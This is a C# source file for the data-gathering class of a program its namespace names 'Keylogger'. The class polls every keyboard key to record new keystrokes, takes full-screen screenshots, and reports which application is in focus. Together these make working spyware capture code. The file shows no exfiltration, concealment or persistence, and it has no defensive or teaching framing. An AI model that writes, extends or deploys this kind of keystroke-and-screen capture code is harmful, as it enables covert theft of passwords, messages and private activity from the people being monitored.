using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Input;

namespace Keylogger
{
    /// <summary>
    /// This class serves as a data source for keylogger. It provides method to get what we want.
    /// </summary>
    public class DataSource
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        
        private HashSet<Key> PressedKeys = new HashSet<Key>();




        /// <summary>
        /// This functions scans currently pressed keys and returns them. Every key is returned just once. If the key is still pressed during second
        /// method call, it is not returned. It's returned again after the key is released and pressed again.
        /// </summary>
        /// <returns>List of keys which were just pressed</returns>
        public List<Key> GetNewPressedKeys()
        {
            List<Key> newPressedKeys = new List<Key>(10);

            // Get state of every key we know
            foreach (Key key in Utils.GetEnumValues<Key>().Where(x => x != Key.None))
            {
                // Is it pressed?
                bool down = Keyboard.IsKeyDown(key);

                // It's not pressed, but it was - we consider this key as released
                if (!down && PressedKeys.Contains(key))
                    PressedKeys.Remove(key);
                else if (down && !PressedKeys.Contains(key)) // The key is pressed, but wasn't pressed before - it will be returned
                {
                    PressedKeys.Add(key);
                    newPressedKeys.Add(key);
                }
            }

            return newPressedKeys;
        }

        /// <summary>
        /// Creates snapshot of computer screen and returns its image
        /// </summary>
        /// <returns>Image of the screen</returns>
        public Bitmap GetScreenSnapshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);

            return bitmap;
        }

        /// <summary>
        /// Search for currently active window (focused) and returns name of the process of that window.
        /// So if user is using Chrome right now, 'chrome' string will be returned.
        /// </summary>
        /// <returns>Name of the process who is tied to currently active window</returns>
        public string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);

            return process.ProcessName;
        }
    }
}
